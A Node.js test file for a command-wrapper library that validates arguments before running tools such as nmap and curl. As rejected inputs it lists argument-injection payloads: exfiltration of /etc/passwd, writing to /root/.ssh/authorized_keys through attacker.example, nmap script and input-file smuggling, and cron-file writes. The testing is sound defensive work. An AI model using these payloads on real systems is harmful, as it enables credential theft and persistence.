import { describe, it, mock } from "node:test";
import assert from "node:assert/strict";
import { writeFileSync, mkdtempSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { loadManifest } from "../src/manifest.js";
import {
  validateArg,
  validateArgMode,
  validateArgWithCustomTypes,
  anchorPattern,
} from "../src/validator.js";
import {
  buildCommand,
  buildCommandArgv,
  compileCommand,
  tokenizeTemplate,
  execute,
} from "../src/executor.js";

// Tests in this file never run a network tool: commands are echo/true,
// dry runs, or pure argv assertions.

function writeTmp(content) {
  const dir = mkdtempSync(join(tmpdir(), "toolclad-w1-"));
  const path = join(dir, "test.clad.toml");
  writeFileSync(path, content);
  return path;
}

function execManifest(exec, args, commandExtra = {}) {
  return {
    tool: { name: "t", binary: "echo", description: "d" },
    args,
    command: { exec, ...commandExtra },
    output: { format: "text" },
  };
}

function templateManifest(template, args, commandExtra = {}) {
  return {
    tool: { name: "t", binary: "echo", description: "d" },
    args,
    command: { template, ...commandExtra },
    output: { format: "text" },
  };
}

function silenceWarn(t) {
  const m = mock.method(console, "warn", () => {});
  if (t && t.after) t.after(() => m.mock.restore());
  return m;
}

const LEADING_DASH = /must not start with '-' or '\+'/;

// --- W1.5 value hygiene -----------------------------------------------------

describe("W1.5 hygiene - TC-1 payloads", () => {
  it("rejects quote-breakout payloads in string", () => {
    assert.throws(
      () => validateArg({ type: "string" }, "' -d @/etc/passwd"),
      /must not contain quote or backslash characters/
    );
    assert.throws(
      () => validateArg({ type: "string" }, "X: y' -d @/etc/passwd -H 'Z: w"),
      /must not contain quote or backslash characters/
    );
  });

  it("rejects quote payloads even in exec mode with allow_whitespace", () => {
    const def = { type: "string", allow_whitespace: true };
    assert.throws(
      () => validateArgMode(def, "X: y' -d @/etc/passwd -H 'Z: w", true),
      /quote or backslash/
    );
  });

  it("rejects flag-smuggling payloads in url", () => {
    assert.throws(
      () =>
        validateArg(
          { type: "url" },
          "https://attacker.example/ -o /root/.ssh/authorized_keys"
        ),
      /must not contain whitespace/
    );
    assert.throws(
      () => validateArg({ type: "url" }, "https://attacker.example/ -o /tmp/pwned"),
      /must not contain whitespace/
    );
  });

  it("never admits whitespace in url, even with allow_whitespace in exec mode", () => {
    const def = { type: "url", allow_whitespace: true };
    assert.throws(
      () => validateArgMode(def, "https://attacker.example/ -o /tmp/pwned", true),
      /must not contain whitespace/
    );
  });
});

describe("W1.5 hygiene - TC-2 payloads", () => {
  it("rejects nmap option smuggling in string", () => {
    assert.throws(
      () => validateArg({ type: "string" }, "-iL /etc/passwd"),
      /must not contain whitespace/
    );
    assert.throws(
      () => validateArg({ type: "string" }, "--script=/tmp/evil.nse"),
      LEADING_DASH
    );
    assert.throws(
      () =>
        validateArg(
          { type: "string" },
          "--script http-fetch --script-args http-fetch.destination=/tmp/d"
        ),
      /must not contain whitespace/
    );
  });

  it("rejects the single-token variants even in exec mode with allow_whitespace", () => {
    const def = { type: "string", allow_whitespace: true };
    assert.throws(() => validateArgMode(def, "-iL /etc/passwd", true), LEADING_DASH);
    assert.throws(
      () => validateArgMode(def, "--script=/tmp/evil.nse", true),
      LEADING_DASH
    );
  });
});

describe("W1.5 hygiene - TC-3 leading dash", () => {
  it("rejects -rf as path", () => {
    assert.throws(() => validateArg({ type: "path" }, "-rf"), LEADING_DASH);
  });

  it("rejects --output=/etc/cron.d/x as string", () => {
    assert.throws(
      () => validateArg({ type: "string" }, "--output=/etc/cron.d/x"),
      LEADING_DASH
    );
  });

  it("rejects -1 as integer (rule applied to the output value)", () => {
    assert.throws(() => validateArg({ type: "integer" }, "-1"), LEADING_DASH);
    assert.throws(() => validateArg({ type: "integer" }, -1), LEADING_DASH);
  });

  it("rejects +short as string", () => {
    assert.throws(() => validateArg({ type: "string" }, "+short"), LEADING_DASH);
  });

  it("allow_leading_dash = true permits -v", () => {
    assert.equal(
      validateArg({ type: "string", allow_leading_dash: true }, "-v"),
      "-v"
    );
    assert.equal(
      validateArg({ type: "integer", allow_leading_dash: true }, "-1"),
      -1
    );
  });

  it("clamping a negative onto a non-negative bound passes", () => {
    assert.equal(
      validateArg({ type: "integer", min: 1, max: 10, clamp: true }, "-5"),
      1
    );
  });

  it("a leading + on a numeric input is normalized away and passes", () => {
    assert.equal(validateArg({ type: "integer" }, "+5"), 5);
  });
});

describe("W1.5 hygiene - remaining rules", () => {
  it("rejects NUL for every type, including enum and numerics", () => {
    assert.throws(
      () => validateArg({ type: "enum", allowed: ["a\0b"] }, "a\0b"),
      /must not contain NUL bytes/
    );
    assert.throws(
      () => validateArg({ type: "integer" }, "1\0"),
      /must not contain NUL bytes/
    );
    assert.throws(
      () => validateArg({ type: "string" }, "ab\0c"),
      /must not contain NUL bytes/
    );
  });

  it("rejects C0 control characters and DEL", () => {
    assert.throws(
      () => validateArg({ type: "string" }, "ab\x01c"),
      /must not contain control characters/
    );
    assert.throws(
      () => validateArg({ type: "string" }, "ab\x7fc"),
      /must not contain control characters/
    );
  });

  it("rejects backslash", () => {
    assert.throws(
      () => validateArg({ type: "string" }, "a\\b"),
      /quote or backslash/
    );
  });

  it("scope_target keeps its specific backslash message", () => {
    assert.throws(
      () => validateArg({ type: "scope_target" }, "a\\b"),
      /scope_target must not contain backslash escape sequences/
    );
  });

  it("rejects whitespace in template mode even with allow_whitespace", () => {
    const def = { type: "string", allow_whitespace: true };
    assert.throws(() => validateArg(def, "a b"), /must not contain whitespace/);
    assert.throws(
      () => validateArgMode(def, "a b", false),
      /must not contain whitespace/
    );
    assert.throws(
      () => validateArgMode({ type: "string" }, "a b", true),
      /must not contain whitespace/
    );
  });

  it("accepts whitespace only with allow_whitespace in exec mode", () => {
    const def = { type: "string", allow_whitespace: true };
    assert.equal(validateArgMode(def, "a b", true), "a b");
  });

  it("rejects Unicode whitespace", () => {
    assert.throws(
      () => validateArg({ type: "string" }, "a\u00a0b"),
      /must not contain whitespace/
    );
    assert.throws(
      () => validateArg({ type: "string" }, "a\u3000b"),
      /must not contain whitespace/
    );
  });

  it("rejects every control character unconditionally, even with allow_whitespace in exec mode", () => {
    const def = { type: "string", allow_whitespace: true };
    for (const bad of ["a\tb", "a\nb", "a\rb", "a\vb", "a\fb", "a\x7fb", "a\x85b", "a\x9fb"]) {
      assert.throws(
        () => validateArgMode(def, bad, true),
        /must not contain control characters/,
        JSON.stringify(bad)
      );
    }
  });

  it("allow_whitespace in exec mode permits only the ASCII space", () => {
    const def = { type: "string", allow_whitespace: true };
    assert.equal(validateArgMode(def, "X-Trace: abc", true), "X-Trace: abc");
    for (const bad of ["a\u00a0b", "a\u2000b", "a\u2028b", "a\u2029b", "a\u3000b"]) {
      assert.throws(
        () => validateArgMode(def, bad, true),
        /must not contain whitespace/,
        JSON.stringify(bad)
      );
    }
  });

  it("msf_options is exempt from the whitespace rule but not the others", () => {
    assert.equal(
      validateArg({ type: "msf_options" }, "RHOSTS 10.0.0.1"),
      "RHOSTS 10.0.0.1"
    );
    assert.throws(
      () => validateArg({ type: "msf_options" }, "-RHOSTS 10.0.0.1"),
      LEADING_DASH
    );
    assert.throws(
      () => validateArg({ type: "msf_options" }, "RHOSTS 'x'"),
      /quote or backslash/
    );
    assert.throws(
      () => validateArg({ type: "msf_options" }, "RHOSTS\u00a010.0.0.1"),
      /must not contain whitespace/
    );
    assert.throws(
      () => validateArg({ type: "msf_options" }, "RHOSTS\t10.0.0.1"),
      /must not contain control characters/
    );
  });

  it("applies hygiene through custom types", () => {
    const customTypes = { tag: { base: "string", pattern: "[a-z]+" } };
    assert.throws(
      () => validateArgWithCustomTypes({ type: "tag" }, "-abc", customTypes),
      LEADING_DASH
    );
    assert.throws(
      () => validateArgWithCustomTypes({ type: "tag" }, "a b", customTypes),
      /must not contain whitespace/
    );
  });
});

// --- W1.6 pattern anchoring -------------------------------------------------

describe("W1.6 pattern anchoring", () => {
  it("anchors a bare pattern so partial matches are rejected", () => {
    const def = { type: "string", pattern: "[a-z]+" };
    assert.equal(validateArg(def, "abc"), "abc");
    assert.throws(() => validateArg(def, "abc123"), /does not match pattern/);
    assert.throws(() => validateArg(def, "123abc"), /does not match pattern/);
  });

  it("anchors regex_match patterns", () => {
    const def = { type: "regex_match", pattern: "[a-z]+" };
    assert.throws(
      () => validateArg(def, "abc123"),
      /does not match required pattern/
    );
  });

  it("anchors custom type patterns", () => {
    const customTypes = { tag: { base: "string", pattern: "[a-z]+" } };
    assert.throws(
      () => validateArgWithCustomTypes({ type: "tag" }, "abc123", customTypes),
      /does not match pattern/
    );
  });

  it("strips one leading ^ and one trailing unescaped $", () => {
    assert.equal(anchorPattern("^[a-z]+$"), "^(?:[a-z]+)$");
    assert.equal(anchorPattern("[a-z]+"), "^(?:[a-z]+)$");
    assert.equal(anchorPattern("a\\$"), "^(?:a\\$)$");
    assert.equal(anchorPattern("a\\\\$"), "^(?:a\\\\)$");
  });

  it("groups alternations so both branches are anchored", () => {
    const def = { type: "string", pattern: "foo|bar" };
    assert.equal(validateArg(def, "bar"), "bar");
    assert.throws(() => validateArg(def, "barx"), /does not match pattern/);
  });
});

// --- W1.1 tokenizer ---------------------------------------------------------

describe("tokenizeTemplate", () => {
  it("splits on whitespace", () => {
    assert.deepEqual(tokenizeTemplate("nmap  -sS\t{target}"), [
      "nmap",
      "-sS",
      "{target}",
    ]);
  });

  it("groups quoted text into one token and strips the quotes", () => {
    assert.deepEqual(tokenizeTemplate(`curl -H 'X: y' "a b" c`), [
      "curl",
      "-H",
      "X: y",
      "a b",
      "c",
    ]);
  });

  it("produces an empty token from empty quotes", () => {
    assert.deepEqual(tokenizeTemplate(`a '' b`), ["a", "", "b"]);
  });

  it("honors backslash escapes outside single quotes", () => {
    assert.deepEqual(tokenizeTemplate(`a\\ b c`), ["a b", "c"]);
    assert.deepEqual(tokenizeTemplate(`"a\\"b"`), ['a"b']);
    assert.deepEqual(tokenizeTemplate(`'a\\b'`), ["a\\b"]);
  });

  it("rejects a placeholder inside quotes", () => {
    assert.throws(
      () => tokenizeTemplate(`-H '{headers}'`),
      /places a placeholder inside quotes at offset 4; placeholders must be whole, unquoted tokens \(use exec = \[\.\.\.\]\)/
    );
    assert.throws(
      () => tokenizeTemplate(`-H "{headers}"`),
      /places a placeholder inside quotes/
    );
  });

  it("allows the {{ escape inside quotes", () => {
    assert.deepEqual(tokenizeTemplate(`-w '\\n%{{http_code}}'`), [
      "-w",
      "\\n%{{http_code}}",
    ]);
  });

  it("rejects unbalanced quotes", () => {
    assert.throws(
      () => tokenizeTemplate(`echo 'abc`),
      /unbalanced quote in command template/
    );
  });

  it("rejects a trailing backslash", () => {
    assert.throws(
      () => tokenizeTemplate(`echo abc\\`),
      /trailing backslash in command template/
    );
  });
});

// --- compile / load-time checks --------------------------------------------

describe("compileCommand", () => {
  it("compiles template to exec, keeps template, flags exec as not declared", (t) => {
    const warn = silenceWarn(t);
    const m = templateManifest("echo -n {target}", {
      target: { type: "string" },
    });
    compileCommand(m);
    assert.deepEqual(m.command.exec, ["echo", "-n", "{target}"]);
    assert.equal(m.command.template, "echo -n {target}");
    assert.equal(m.command._execWasDeclared, false);
    assert.ok(!Object.keys(m.command).includes("_execWasDeclared"));
    assert.equal(warn.mock.callCount(), 1);
    assert.match(
      warn.mock.calls[0].arguments[0],
      /^warning: \[command\] template is deprecated and will be removed in the next minor release; use exec = \[\.\.\.\]$/
    );
  });

  it("warns once per load, not once per build", (t) => {
    const warn = silenceWarn(t);
    const m = templateManifest("echo {target}", { target: { type: "string" } });
    buildCommand(m, { target: "a" });
    buildCommand(m, { target: "b" });
    assert.equal(warn.mock.callCount(), 1);
  });

  it("flags a declared exec and does not warn", (t) => {
    const warn = silenceWarn(t);
    const m = execManifest(["echo", "{target}"], { target: { type: "string" } });
    compileCommand(m);
    assert.equal(m.command._execWasDeclared, true);
    assert.equal(warn.mock.callCount(), 0);
  });

  it("refuses a template with a placeholder inside quotes", (t) => {
    silenceWarn(t);
    const m = templateManifest("curl -H '{headers}' {url}", {
      headers: { type: "string" },
      url: { type: "url" },
    });
    assert.throws(() => compileCommand(m), /placeholder inside quotes/);
  });

  it("refuses a conditional template with a placeholder inside quotes", (t) => {
    silenceWarn(t);
    const m = execManifest(
      ["echo", "{_hdr}", "{url}"],
      { headers: { type: "string" }, url: { type: "url" } },
      { conditionals: { hdr: { when: "headers != ''", template: "-H '{headers}'" } } }
    );
    assert.throws(
      () => compileCommand(m),
      /command\.conditionals\.hdr template places a placeholder inside quotes/
    );
  });

  it("refuses an unresolved placeholder", () => {
    const m = execManifest(["echo", "{nope}"], { target: { type: "string" } });
    assert.throws(
      () => compileCommand(m),
      /unresolved placeholder '\{nope\}' in command/
    );
  });

  it("refuses an unresolved placeholder in a conditional", () => {
    const m = execManifest(
      ["echo", "{_c}"],
      { a: { type: "string" } },
      { conditionals: { c: { when: "a != ''", template: "-x {zzz}" } } }
    );
    assert.throws(
      () => compileCommand(m),
      /unresolved placeholder '\{zzz\}' in command\.conditionals\.c/
    );
  });

  it("no longer recognizes the legacy _scan_flags alias", () => {
    const m = execManifest(
      ["echo", "{_scan_flags}", "{target}"],
      {
        target: { type: "string" },
        scan_type: { type: "enum", allowed: ["ping"] },
      },
      { mappings: { scan_type: { ping: "-sn" } } }
    );
    assert.throws(
      () => compileCommand(m),
      /unresolved placeholder '\{_scan_flags\}'/
    );
  });

  it("accepts every declared variable class", () => {
    const m = execManifest(
      [
        "echo",
        "{target}",
        "{_timeout}",
        "{_scan_type_flags}",
        "{_c}",
        "{_scan_id}",
        "{_output_file}",
        "{_evidence_dir}",
        "prefix-{target}-{_timeout}",
      ],
      {
        target: { type: "string" },
        scan_type: { type: "enum", allowed: ["ping"] },
      },
      {
        defaults: { _timeout: "600s" },
        mappings: { scan_type: { ping: "-sn" } },
        conditionals: { c: { when: "target != ''", template: "-t" } },
      }
    );
    assert.doesNotThrow(() => compileCommand(m));
  });

  it("refuses a multi-token variable embedded in a larger token", () => {
    const m = execManifest(
      ["echo", "x{_scan_type_flags}"],
      { scan_type: { type: "enum", allowed: ["ping"] } },
      { mappings: { scan_type: { ping: "-sn" } } }
    );
    assert.throws(
      () => compileCommand(m),
      /^Error: placeholder '\{_scan_type_flags\}' expands to multiple tokens and must be a whole token in command$/
    );
  });

  it("refuses end_of_options other than --", () => {
    const m = execManifest(["echo", "{a}"], { a: { type: "string" } }, {
      end_of_options: "-",
    });
    assert.throws(
      () => compileCommand(m),
      /command\.end_of_options must be exactly "--"/
    );
  });

  it("refuses a non-string exec element", () => {
    const m = execManifest(["echo", 1], {});
    assert.throws(() => compileCommand(m), /non-empty array of strings/);
  });

  it("skips {{ and }} escapes in the placeholder scan", () => {
    const m = execManifest(["echo", "-w", "\\n%{{http_code}}"], {});
    assert.doesNotThrow(() => compileCommand(m));
  });
});

describe("loadManifest - load-time checks", () => {
  const head = `
[tool]
name = "t"
binary = "echo"
description = "d"

[args.target]
position = 1
required = true
type = "string"
description = "t"
`;
  const tail = `
[output]
format = "text"
`;

  it("refuses a template with a placeholder inside quotes", () => {
    const path = writeTmp(`${head}
[command]
template = "echo '{target}'"
${tail}`);
    assert.throws(() => loadManifest(path), /placeholder inside quotes/);
  });

  it("refuses an unresolved placeholder", () => {
    const path = writeTmp(`${head}
[command]
exec = ["echo", "{target}", "{missing}"]
${tail}`);
    assert.throws(() => loadManifest(path), /unresolved placeholder '\{missing\}'/);
  });

  it("refuses an invalid end_of_options value", () => {
    const path = writeTmp(`${head}
[command]
exec = ["echo", "{target}"]
end_of_options = "---"
${tail}`);
    assert.throws(() => loadManifest(path), /end_of_options must be exactly "--"/);
  });

  it("compiles a legacy template with a deprecation warning", (t) => {
    const warn = silenceWarn(t);
    const path = writeTmp(`${head}
[command]
template = "echo -n {target}"
${tail}`);
    const m = loadManifest(path);
    assert.deepEqual(m.command.exec, ["echo", "-n", "{target}"]);
    assert.equal(m.command._execWasDeclared, false);
    assert.equal(warn.mock.callCount(), 1);
  });

  it("loads a declared exec with conditionals and end_of_options", (t) => {
    const warn = silenceWarn(t);
    const path = writeTmp(`${head}
[args.headers]
position = 2
required = false
type = "string"
default = ""
allow_whitespace = true
description = "h"

[command]
exec = ["echo", "-w", "\\\\n%{{http_code}}", "{_header_flags}", "{target}"]
end_of_options = "--"

[command.conditionals.header_flags]
when = "headers != ''"
template = "-H {headers}"
${tail}`);
    const m = loadManifest(path);
    assert.equal(m.command._execWasDeclared, true);
    assert.equal(warn.mock.callCount(), 0);
    const { argv } = buildCommandArgv(m, {
      target: "example.com",
      headers: "X-Trace: abc",
    });
    assert.deepEqual(argv, [
      "echo",
      "-w",
      "\\n%{http_code}",
      "-H",
      "X-Trace: abc",
      "--",
      "example.com",
    ]);
  });
});

// --- W1.3 substitution ------------------------------------------------------

describe("substitution - argv boundaries", () => {
  it("a whitespace-containing value is exactly one argv element (exec + allow_whitespace)", () => {
    const m = execManifest(["echo", "-n", "{msg}"], {
      msg: { type: "string", required: true, allow_whitespace: true },
    });
    const { argv } = buildCommandArgv(m, { msg: "hello world  twice" });
    assert.deepEqual(argv, ["echo", "-n", "hello world  twice"]);
    assert.equal(argv.length, 3);
  });

  it("the OS receives that single element", () => {
    const m = execManifest(["echo", "{msg}"], {
      msg: { type: "string", required: true, allow_whitespace: true },
    });
    const envelope = execute(m, { msg: "hello world" });
    assert.equal(envelope.status, "success");
    assert.equal(envelope.results.raw_output, "hello world\n");
  });

  it("dry run exposes the argv array", () => {
    const m = execManifest(["echo", "{msg}"], {
      msg: { type: "string", required: true, allow_whitespace: true },
    });
    const r = execute(m, { msg: "a b" }, { dryRun: true });
    assert.equal(r.status, "dry_run");
    assert.deepEqual(r.argv, ["echo", "a b"]);
  });

  it("a compiled template is still template mode: whitespace rejected", (t) => {
    silenceWarn(t);
    const m = templateManifest("echo {msg}", {
      msg: { type: "string", required: true, allow_whitespace: true },
    });
    assert.throws(
      () => buildCommand(m, { msg: "hello world" }),
      /must not contain whitespace/
    );
  });

  it("drops a token that was exactly one placeholder resolving to empty", () => {
    const m = execManifest(["echo", "{opt}", "x={opt}", "end"], {
      opt: { type: "string", required: false, default: "" },
    });
    const { argv } = buildCommandArgv(m, {});
    assert.deepEqual(argv, ["echo", "x=", "end"]);
  });

  it("an unset optional with no default disappears", () => {
    const m = execManifest(["echo", "{opt}", "end"], {
      opt: { type: "string", required: false },
    });
    const { argv } = buildCommandArgv(m, {});
    assert.deepEqual(argv, ["echo", "end"]);
  });

  it("substitutes textually inside a token without splitting", () => {
    const m = execManifest(["echo", "{proto}://{host}:{port}"], {
      proto: { type: "enum", allowed: ["http"], default: "http" },
      host: { type: "string", required: true },
      port: { type: "port", default: 80 },
    });
    const { argv } = buildCommandArgv(m, { host: "example.com" });
    assert.deepEqual(argv, ["echo", "http://example.com:80"]);
  });

  it("unescapes {{ and }} to literal braces", () => {
    const m = execManifest(["echo", "-w", "\\n%{{http_code}}", "{{{a}}}"], {
      a: { type: "string", default: "v" },
    });
    const { argv } = buildCommandArgv(m, {});
    assert.deepEqual(argv, ["echo", "-w", "\\n%{http_code}", "{v}"]);
  });

  it("a quoted {{ escape in a template reaches argv as a literal brace", (t) => {
    silenceWarn(t);
    const m = templateManifest("echo -w '%{{http_code}}' {a}", {
      a: { type: "string", default: "v" },
    });
    const { argv } = buildCommandArgv(m, {});
    assert.deepEqual(argv, ["echo", "-w", "%{http_code}", "v"]);
  });
});

describe("substitution - end_of_options", () => {
  it("inserts -- before the first user-arg token, once", () => {
    const m = execManifest(
      ["echo", "{_scan_id}", "-n", "{a}", "{b}"],
      { a: { type: "string", required: true }, b: { type: "string", required: true } },
      { end_of_options: "--" }
    );
    const { argv } = buildCommandArgv(m, { a: "one", b: "two" });
    assert.equal(argv[0], "echo");
    assert.match(argv[1], /^\d+-[0-9a-f]{4}$/);
    assert.deepEqual(argv.slice(2), ["-n", "--", "one", "two"]);
  });

  it("inserts nothing when no token is solely a user-arg placeholder", () => {
    const m = execManifest(
      ["echo", "-n", "v={a}"],
      { a: { type: "string", required: true } },
      { end_of_options: "--" }
    );
    const { argv } = buildCommandArgv(m, { a: "one" });
    assert.deepEqual(argv, ["echo", "-n", "v=one"]);
  });

  it("skips a dropped empty optional and goes before the next user-arg token", () => {
    const m = execManifest(
      ["echo", "{opt}", "{a}"],
      { opt: { type: "string", required: false }, a: { type: "string", required: true } },
      { end_of_options: "--" }
    );
    const { argv } = buildCommandArgv(m, { a: "one" });
    assert.deepEqual(argv, ["echo", "--", "one"]);
  });

  it("does not insert -- inside conditional expansions", () => {
    const m = execManifest(
      ["echo", "{_hdr}", "{url}"],
      {
        headers: { type: "string", required: false, default: "", allow_whitespace: true },
        url: { type: "url", required: true },
      },
      {
        end_of_options: "--",
        conditionals: { hdr: { when: "headers != ''", template: "-H {headers}" } },
      }
    );
    const { argv } = buildCommandArgv(m, {
      headers: "X-Trace: abc",
      url: "https://example.com/",
    });
    assert.deepEqual(argv, ["echo", "-H", "X-Trace: abc", "--", "https://example.com/"]);
  });
});

describe("substitution - trusted multi-token variables", () => {
  it("conditionals resolve under the _<name> convention", (t) => {
    silenceWarn(t);
    const m = templateManifest(
      "echo {_verbose} {target}",
      {
        target: { type: "string", required: true },
        mode: { type: "enum", allowed: ["loud", "quiet"], default: "quiet" },
        level: { type: "integer", default: 3 },
      },
      {
        conditionals: {
          verbose: { when: "mode == 'loud'", template: "-v --level {level}" },
        },
      }
    );
    assert.deepEqual(buildCommandArgv(m, { target: "host", mode: "loud" }).argv, [
      "echo",
      "-v",
      "--level",
      "3",
      "host",
    ]);
    assert.deepEqual(buildCommandArgv(m, { target: "host" }).argv, ["echo", "host"]);
    assert.equal(buildCommand(m, { target: "host", mode: "loud" }).command, "echo -v --level 3 host");
  });

  it("a conditional keeps a whitespace value as one element", () => {
    const m = execManifest(
      ["echo", "{_header_flags}", "{target}"],
      {
        headers: { type: "string", required: false, default: "", allow_whitespace: true },
        target: { type: "string", required: true },
      },
      { conditionals: { header_flags: { when: "headers != ''", template: "-H {headers}" } } }
    );
    const { argv } = buildCommandArgv(m, { headers: "X-Trace: abc", target: "h" });
    assert.deepEqual(argv, ["echo", "-H", "X-Trace: abc", "h"]);
  });

  it("mappings splice tokenized flags under _<arg>_flags", () => {
    const m = execManifest(
      ["echo", "{_scan_type_flags}", "{target}"],
      {
        target: { type: "scope_target", required: true },
        scan_type: { type: "enum", allowed: ["ping", "service"], required: true },
      },
      { mappings: { scan_type: { ping: "-sn -PE", service: "-sT -sV" } } }
    );
    const { argv } = buildCommandArgv(m, { target: "10.0.1.0/24", scan_type: "service" });
    assert.deepEqual(argv, ["echo", "-sT", "-sV", "10.0.1.0/24"]);
  });

  it("refuses at load an enum mapping that does not cover every allowed value", () => {
    const m = execManifest(
      ["echo", "{_scan_type_flags}", "{target}"],
      {
        target: { type: "scope_target", required: true },
        scan_type: { type: "enum", allowed: ["ping", "other", "third"], required: true },
      },
      { mappings: { scan_type: { ping: "-sn" } } }
    );
    assert.throws(
      () => compileCommand(m),
      /\[command\.mappings\.scan_type\] does not cover enum values: other, third/
    );
  });

  it("a value with no mapping entry is a build error, not an empty splice", () => {
    const m = execManifest(
      ["echo", "{_mode_flags}", "{target}"],
      {
        target: { type: "scope_target", required: true },
        mode: { type: "string", required: true },
      },
      { mappings: { mode: { fast: "-f" } } }
    );
    assert.throws(
      () => buildCommandArgv(m, { target: "10.0.1.1", mode: "slow" }),
      /^Error: no mapping for argument 'mode' value 'slow' in \[command\.mappings\.mode\]$/
    );
  });

  it("mapping a value to the empty string means no flags", () => {
    const m = execManifest(
      ["echo", "{_scan_type_flags}", "{target}"],
      {
        target: { type: "scope_target", required: true },
        scan_type: { type: "enum", allowed: ["ping", "plain"], required: true },
      },
      { mappings: { scan_type: { ping: "-sn", plain: "" } } }
    );
    const { argv } = buildCommandArgv(m, { target: "10.0.1.1", scan_type: "plain" });
    assert.deepEqual(argv, ["echo", "10.0.1.1"]);
  });

  it("an absent optional mapped argument contributes nothing", () => {
    const m = execManifest(
      ["echo", "{_mode_flags}", "{target}"],
      {
        target: { type: "scope_target", required: true },
        mode: { type: "string", required: false },
      },
      { mappings: { mode: { fast: "-f" } } }
    );
    const { argv } = buildCommandArgv(m, { target: "10.0.1.1" });
    assert.deepEqual(argv, ["echo", "10.0.1.1"]);
  });

  it("executor mode validates strictly (whitespace rejected)", () => {
    const m = {
      tool: { name: "t", description: "d" },
      args: { msg: { type: "string", required: true, allow_whitespace: true } },
      command: { executor: "scripts/wrapper.sh" },
      output: { format: "text" },
    };
    assert.throws(
      () => buildCommand(m, { msg: "a b" }),
      /must not contain whitespace/
    );
  });
});
